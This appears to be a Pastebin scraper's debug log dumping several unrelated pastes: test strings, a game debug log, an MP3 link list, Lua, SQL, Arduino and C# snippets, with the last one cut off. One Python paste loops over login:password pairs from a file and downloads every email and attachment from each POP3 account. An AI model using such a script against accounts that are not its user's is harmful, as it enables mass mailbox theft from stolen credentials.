nInès@findmetesting.com\nOcéane@findmetesting.com\nMarie-ève@findmetesting.com\nRébecca@findmetesting.com\nZoé@findmetesting.com\nLài@findmetesting.com\nRachèle@findmetesting.com\nCécile@findmetesting.com\nMaïlys@findmetesting.com\nGarçon@findmetesting.com\nhereiam@testing.com\n\xa0\nIt's a game of per%entage percentage.\nFindme#testing Findme testing.\nOver&over&over Over over over.\n[findmeinbrackets], findmeinbrackets\n(findmeinbrackets), findmeinbrackets\n<findmeinbrackets>, findmeinbrackets\n{findmeinbrackets>}, findmeinbrackets\nhttp://findme-testing.here.com\nhttp:\\\\findme-testing.here.com\n\xa0\nVestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. \nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.\n\xa0\nVivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.\n\xa0\nFuzzy-Wuzzy - DASH\nFuzzy;Wuzzy - COLON\nFuzzy!Wuzzy - EXCLAMATION\nFuzzy£Wuzzy\xa0 \xa0 - POUND\nFuzzy#Wuzzy - HASH\nFuzzy%Wuzzy - PERCENT\nFuzzy@Wuzzy - AT\nFuzzy&Wuzzy - AND\nFuzzy=Wuzzy - EQUAL\nFuzzy§Wuzzy\nFuzzy~Wuzzy\nFuzzy?Wuzzy \xa0- QUESTION MARK\nFuzzy$Wuzzy \xa0- DOLLAR\nFuzzy[Wuzzy] - BRACKETS\nFuzzy^Wuzzy\nFuzzy(Wuzzy) - BRACKETS\nFuzzy+Wuzzy \xa0- PLUS\nFuzzy±Wuzzy\xa0 \xa0 \xa0- PLUS/MINUE\nFuzzy|Wuzzy \xa0- PIPE\nFuzzy/Wuzzy \xa0- FORWARDSLASH\nFuzzy<Wuzzy> - BRACKETS\nFuzzy{Wuzzy} - CURLY\nFuzzy\\Wuzzy \xa0- BACKSLASH", date='2022-06-01 07:45:53 +00:00', hash_val='d521891abb2ecbda38f824b8a3d8104a', url='/qAebbKk4', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='RidwanRF', title='debug', content="Place container on the ground\nground: 4.2747402191162, oz: 1.4519195556641 z: 5.2747402191162 z-oZ: 3.8228206634521\nPlace container on the ground\nground: 3.5087738037109, oz: 1.4519195556641 z: 4.5087738037109 z-oZ: 3.0568542480469\nPlace container on the ground\nground: 3.4450035095215, oz: 1.4519195556641 z: 4.4450035095215 z-oZ: 2.9930839538574\nPlace container on the ground\nground: 2.9643530845642, oz: 1.4519195556641 z: 3.9643530845642 z-oZ: 2.5124335289001\nPlace container on the ground\nground: 2.964608669281, oz: 1.4519195556641 z: 3.964608669281 z-oZ: 2.5126891136169\nPlace container on the ground\nground: 2.9645137786865, oz: 1.4519195556641 z: 3.9645137786865 z-oZ: 2.5125942230225\nPress 'space' to detach/release magnet!\nground: 2.5546875, oZ: 1.4519195556641 z: 5.0872707366943 z-oZ: 3.6353511810303\nPlace container on the ground\nground: 2.5546875, oZ: 1.4519195556641 z: 4.3248100280762 z-oZ: 2.8728904724121\nPlace container on the ground\nground: 2.5546875, oZ: 1.4519195556641 z: 3.964515209198 z-oZ: 2.5125956535339\nCorrect placement of container!", date='2022-06-01 07:16:33 +00:00', hash_val='7f8b3015e7a25053e4628abcae0c6d7d', url='/A2nuM6yG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='spidersam', title='05-2022', content='[\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-02-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/32dc10bd-858e-b80c-9f15-278d0b68c2b9.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-03-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/ea4efc17-9f17-0e26-64b9-c030c1775a05.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-04-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/49edac30-6207-bc7c-a974-f713082304ce.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-05-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/11318565-16f8-04d3-bcf2-45816fd7223b.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-06-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/00bc3408-f311-cbb3-2cc2-e1b8120c02a9.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-07-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/9f9378bc-b09f-8367-57be-7cf435fac6a1.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-09-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/3e10b8b4-49e2-5e57-47ed-db2eaf4e0e14.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-10-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/e6d4de20-5e87-975a-b5c7-4422136b4211.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-11-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/cecd8271-d5eb-5b63-35e9-4fc1ae5e4dd7.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-12-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/1a1c0347-7663-771b-dc12-d5fe7754e845.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-13-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/0464c959-0458-1342-68bf-40a997d1cff5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-14-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/b2972776-d4e3-c346-17c2-d72be66d549e.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-16-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/10047a3b-1047-5a98-066c-e117c3f5790d.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-17-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/3af361b7-fd42-2f28-6e5e-a15e794e4ee5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-18-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/6b51c479-cc1e-fce8-eb8e-d5ebb284f573.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-19-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/086b736f-ce8e-0f52-536f-de3948a124d5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-20-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/25d5694a-547f-bf87-4a7e-ac2d298919c5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-21-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/e3510150-88ed-2a16-96a6-ef04a2bf1cc1.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-23-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/245f4569-ec96-4886-cf5b-4363568a3755.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-24-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/3d57ce55-4d37-3f79-226e-ff286d55df1f.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-25-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/8f1da29d-52f0-b2db-7863-3a07da55dfb6.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-26-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/14d1713b-a1b3-7aed-43a9-5a69fbf3b086.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-27-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/99ae159e-0f65-068c-f497-90d8099dbfe7.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-28-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/35d2b851-dbde-a53b-1a61-e2522de7e105.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-30-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/06bb83b9-8fde-d386-fbda-7722f03aed7b.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-31-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/8d1297e7-0646-c732-8d23-7d492f943050.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 }\n]', date='2022-06-01 07:12:11 +00:00', hash_val='bd484a995d3e11682568b8e63a18171e', url='/10iPX6E0', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Kitsumi', title='[GMod] Chat Net', content='util.AddNetworkString(""subscribe:chat_net"")\nutil.AddNetworkString(""unsubscribe:chat_net"")\nutil.AddNetworkString(""chat_net"")\n\xa0\nlocal subscribers = {}\n\xa0\nnet.Receive(""subscribe:chat_net"", function(len, ply)\n\xa0 \xa0 if not table.HasValue(subscribers, ply) then\n\xa0 \xa0 \xa0 \xa0 subscribers[#subscribers + 1] = ply\n\xa0 \xa0 end\nend)\n\xa0\nnet.Receive(""unsubscribe:chat_net"", function(len, ply)\n\xa0 \xa0 if table.HasValue(subscribers, ply) then\n\xa0 \xa0 \xa0 \xa0 table.RemoveByValue(subscribers, ply)\n\xa0 \xa0 end\nend)\n\xa0\nhook.Add(""PlayerSay"", ""chat_net_msg"", function(ply, text, team)\n\xa0 \xa0 net.Start(""chat_net"")\n\xa0 \xa0 net.WriteEntity(ply)\n\xa0 \xa0 net.WriteString(text)\n\xa0 \xa0 net.WriteBool(team)\n\xa0 \xa0 local receivers = {}\n\xa0 \xa0 for idx, receiver in ipairs(subscribers) do\n\xa0 \xa0 \xa0 \xa0 if (team and receiver:Team() == ply:Team()) or (not Team) then\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 receivers[#receivers + 1] = receiver\n\xa0 \xa0 \xa0 \xa0 end\n\xa0 \xa0 end\n\xa0 \xa0 net.Send(receivers)\nend)\n\xa0\nhook.Add(""PlayerDisconnected"", ""chat_net_msg_remove_players"", function(ply)\n\xa0 \xa0 if table.HasValue(subscribers, ply) then\n\xa0 \xa0 \xa0 \xa0 table.RemoveByValue(subscribers, ply)\n\xa0 \xa0 end\nend)', date='2022-06-01 07:06:50 +00:00', hash_val='a801d7923ca3dc7f98e7b34336083d09', url='/VMpNcgiY', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='askanton', title='Python pop3 mail', content='import poplib\n\xa0\nfrom email.parser import BytesParser\nfrom email.policy import default\nimport os\npop3server = \'0.0.0.0\'\nusername = \'qqqqq@qqqqq.qqq.qqq\'\npassword = \'qqqqqqq\'\n\xa0\npop3server = poplib.POP3(pop3server) \xa0# 110\n# pop3server = poplib.POP3_SSL(pop3server) # 995\n\xa0\nprint(pop3server.getwelcome()) \xa0# show welcome message\npop3server.user(username)\npop3server.pass_(password)\npop3info = pop3server.stat() \xa0# access mailbox status\nmailcount = pop3info[0] \xa0# toral email\nprint(mailcount)\nprint(""Total no. of Email : "" , mailcount)\nprint (""\\n\\nStart Reading Messages\\n\\n"")\nfor i in range(mailcount):\n\xa0 \xa0 os.mkdir(""{}"".format(i))\n\xa0 \xa0 for message in pop3server.retr(i+1)[1]:\n\xa0 \xa0 \xa0 \xa0 my_file = open(""{}/mail{}.txt"".format(i,i), ""a"")\n\xa0 \xa0 \xa0 \xa0 my_file.write(str(message) + ""\\n"")\n\xa0 \xa0 print(""*************************************************************************************************"")\n\xa0 \xa0 \xa0 \xa0 \n\xa0\npop3server.quit()', date='2022-06-01 06:58:04 +00:00', hash_val='82d04af5c9c0649a9ef281803642d091', url='/qzNiTNTG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='askanton', title='Забираем всі листи та вкладення з поштового ящика по протоколу pop3', content='import poplib\nfrom email.parser import BytesParser\nfrom email.policy import default\nimport os\n\xa0\nf = open(""accounts.txt"") \xa0# читаємо файл з аккаунтами\naccs = f.readlines()\nf.close()\ni = 0\n#print(accs)\n\xa0\n\xa0\ndef check(login, passwd): \xa0# описуємо основну функію\n\xa0 \xa0 file_path = str(login)\n\xa0 \xa0 os.mkdir(""{}"".format(file_path)) \xa0# створюемо папки для пошт\n\xa0 \xa0 pop = poplib.POP3(\'0.0.0.0\') \xa0# конектимся до пошти\n\xa0 \xa0 pop.user(login)\n\xa0 \xa0 pop.pass_(passwd)\n\xa0 \xa0 #print(pop.getwelcome())\n\xa0 \xa0 stat = pop.stat()\n\xa0 \xa0 list_count = int(stat[0])\n\xa0 \xa0 print(""Total mails: "", list_count)\n\xa0 \xa0 mailcount = pop.list() \xa0# рахуємо кількість листів\n\xa0 \xa0 if list_count != 0:\n\xa0 \xa0 \xa0 \xa0 text_count, img_count, pdf_count, html_count = 0, 0, 0, 0\n\xa0 \xa0 \xa0 \xa0 for k in range(1, list_count): \xa0# перебираємо всі листи\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 r = pop.retr(k)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(k)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 bp = BytesParser(policy=default).parsebytes(b\'\\r\\n\'.join(r[1])) \xa0# парсимо вміст отриманного листа\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for part in bp.walk(): \xa0# відділяємо різні типи вмісту\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if part.get_content_type() == \'text/plain\': \xa0# текст\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 message = part.get_content()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 my_file = open(""{}/text_{}.txt"".format(file_path, text_count), ""a"", encoding=""utf-8"") \xa0# записуемо лист в папку\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 my_file.write(message)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 text_count = text_count + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(""text/plain - done"")\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if part.get_content_type() == \'text/html\': \xa0# html\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 message = part.get_content()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 my_file = open(""{}/html_{}.html"".format(file_path, html_count), ""a"", encoding=""utf-8"") \xa0# записуемо лист в папку\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 my_file.write(message)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 html_count = html_count + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(""text/html - done"")\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if part.get_content_type() == \'image/jpeg\': \xa0# jpeg\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 message = part.get_payload(decode=True)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 with open(""{}/img_{}.jpg"".format(file_path, img_count), \'wb\') as f:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 f.write(part.get_payload(decode=True))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 img_count = img_count + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(""image/jpeg - done"")\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if part.get_content_type() == \'application/pdf\': \xa0# pdf\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 message = part.get_payload(decode=True)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 with open(""{}/pdf_{}.pdf"".format(file_path, pdf_count), \'wb\') as f:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 f.write(part.get_payload(decode=True))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pdf_count = pdf_count + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(""application/pdf"")\n\xa0\n\xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 print(""No messages"")\n\xa0\nfor acc in accs: \xa0# перебираемо поштові аккаунти\n\xa0 \xa0 i = i + 1\n\xa0 \xa0 acc = acc.replace(\'\\n\', \'\')\n\xa0 \xa0 acc = acc.replace(\' \', \'\')\n\xa0 \xa0 acc = acc.split(\':\')\n\xa0\n\xa0 \xa0 if len(acc) == 2: \xa0# запускаем перевірку\n\xa0 \xa0 \xa0 \xa0 print(acc)\n\xa0 \xa0 \xa0 \xa0 check(acc[0], acc[1])\n\xa0 \xa0 \xa0 \xa0 print(""************************************************************************"")', date='2022-06-01 06:56:28 +00:00', hash_val='2259c47d817d189bef06a60b6e2ee3d6', url='/ffPhUYtR', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')})]
2022-06-01T17:08:34.825936+0300 DEBUG [PASTEBIN] problem with data [DataStructure(author='Maks140888', title='Untitled', content="create or replace function find_first_childs (obj_x VARCHAR2) \nreturn objects_below as first_childs objects_below;\nbegin \n\xa0 \xa0 select LPAD(' ', 5*level)||objects.name \n\xa0 \xa0 BULK COLLECT into first_childs\n\xa0 \xa0 FROM objects JOIN object_types USING (object_type_id)\n\xa0 \xa0 where level < (\n\xa0 \xa0 \xa0 \xa0 select level from objects where name = obj_x\n\xa0 \xa0 \xa0 \xa0 start with parent_id is null CONNECT by prior object_id = parent_id\n\xa0 \xa0 \xa0 \xa0 ) + 1\n\xa0 \xa0 START WITH objects.name = obj_x\n\xa0 \xa0 \xa0 \xa0 CONNECT by prior objects.object_id = objects.parent_id;\n\xa0 \xa0 \n\xa0 \xa0 return first_childs;\nend;\n\xa0\nselect * from find_first_childs('ін-94-1');", date='2022-06-01 14:05:13 +00:00', hash_val='b41aca26982dbdf9bd73e9f30bf25f21', url='/kEQRsKq0', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='AshfaqFardin', title='blink', content='//define\n#define Led 13\n\xa0\n//setup\nvoid setup(){\n\xa0 \xa0 Serial.begin(9600);\n\xa0 \xa0 pinMode(Led, OUTPUT);\n}\n\xa0\n//main\nvoid loop(){\n\xa0 \xa0 digitalWrite(Led, HIGH);\n\xa0 \xa0 delay(2000);\n\xa0 \xa0 digitalWrite(Led, LOW);\n\xa0 \xa0 delay(2000);\n}', date='2022-06-01 14:03:20 +00:00', hash_val='a56b840038d9e0e1663c1e5801f61237', url='/XJ1Tt0Dd', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='vvsvvs', title='Untitled', content='using System;\nusing System.Collections.Generic;\n\xa0\nnamespace Hot_Potato\n{\n\xa0 \xa0 class HotPotato\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 static void Main(string[] args)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Queue<string> kids = new Queue<string>(Console.ReadLine().Split(\' \', StringSplitOptions.RemoveEmptyEntries));\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int multiplicity = int.Parse(Console.ReadLine());\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int curent = 0;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 while (kids.Count > 1)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 curent++;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 string kid = kids.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (!(curent % multiplicity).Equals(0))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 